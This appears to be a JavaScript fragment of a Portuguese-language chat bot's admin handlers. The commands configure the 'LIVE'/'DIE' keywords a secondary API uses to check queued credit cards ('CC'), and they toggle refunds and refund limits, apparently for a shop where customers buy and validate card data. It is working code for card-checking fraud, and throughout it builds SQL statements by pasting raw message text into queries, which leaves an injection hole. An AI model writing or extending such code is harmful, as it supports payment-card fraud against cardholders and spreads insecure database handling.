        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavralivesec2===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]

                CHK_PALAVRA_LIVE2_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_LIVE2}' WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ LIVE, FOI ALTERADA! (API SECUNDÁRIA)*

*1º PALAVRA AO RETORNAR LIVE*

*ANTES:* ${CHK_PALAVRA_LIVE2_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_LIVE2} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavradiesec1===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).get()["VALOR"]

                CHK_PALAVRA_DIE_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_DIE}' WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ DIE, FOI ALTERADA! (API SECUNDÁRIA)*

*1º PALAVRA AO RETORNAR DIE*

*ANTES:* ${CHK_PALAVRA_DIE_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_DIE} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavradiesec2===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]

                CHK_PALAVRA_DIE2_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_DIE2}' WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ DIE, FOI ALTERADA! (API SECUNDÁRIA)*

*1º PALAVRA AO RETORNAR DIE*

*ANTES:* ${CHK_PALAVRA_DIE2_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_DIE2} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/reembolso===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "0") {
                Texto = `*Reembolso/Troca Desativado!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                Texto = `*Reembolso/Troca Ativado!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/reembolsolimite===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                LIMITE_REEMBOLSO_CHK_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_REEMBOLSO_CHK'`).get()["VALOR"]
                LIMITE_REEMBOLSO_CHK = msg[1]

                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${LIMITE_REEMBOLSO_CHK}' WHERE PARAMETRO = 'LIMITE_REEMBOLSO_CHK'`).run()

